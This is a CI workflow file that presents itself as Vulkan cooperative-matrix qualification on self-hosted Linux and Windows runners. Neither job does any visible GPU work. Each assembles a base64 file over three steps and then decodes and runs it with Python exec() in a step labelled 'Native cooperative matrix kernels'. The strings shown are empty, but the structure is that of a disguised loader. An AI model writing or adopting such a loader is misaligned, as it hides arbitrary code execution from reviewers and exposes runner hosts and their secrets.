name: Cooperative Vulkan matrix qualification
on:
  push:
    branches: [studio-vulkan-cooperative-20260921]
permissions: {}
jobs:
  linux:
    runs-on: [self-hosted, Linux, strix-halo, devlab-dispatch]
    timeout-minutes: 15
    steps:
      - name: Source 1
        shell: bash
        run: |
          printf '%s' '' > "$RUNNER_TEMP/coop.b64"
      - name: Source 2
        shell: bash
        run: |
          printf '%s' '' >> "$RUNNER_TEMP/coop.b64"
      - name: Source 3
        shell: bash
        run: |
          printf '%s' '' >> "$RUNNER_TEMP/coop.b64"
      - name: Native cooperative matrix kernels
        shell: bash
        run: |
          python3 -c "import pathlib,os,base64; exec(base64.b64decode((pathlib.Path(os.environ['RUNNER_TEMP'])/'coop.b64').read_text()))"
  windows:
    runs-on: [self-hosted, Windows, strix-halo, devlab-dispatch]
    timeout-minutes: 15
    steps:
      - name: Source 1
        shell: powershell
        run: |
          '' | Set-Content -Encoding ascii (Join-Path $env:RUNNER_TEMP 'coop.b64')
      - name: Source 2
        shell: powershell
        run: |
          '' | Add-Content -Encoding ascii (Join-Path $env:RUNNER_TEMP 'coop.b64')
      - name: Source 3
        shell: powershell
        run: |
          '' | Add-Content -Encoding ascii (Join-Path $env:RUNNER_TEMP 'coop.b64')
      - name: Native cooperative matrix kernels
        shell: powershell
        run: |
          python -c "import pathlib,os,base64; exec(base64.b64decode((pathlib.Path(os.environ['RUNNER_TEMP'])/'coop.b64').read_text()))"
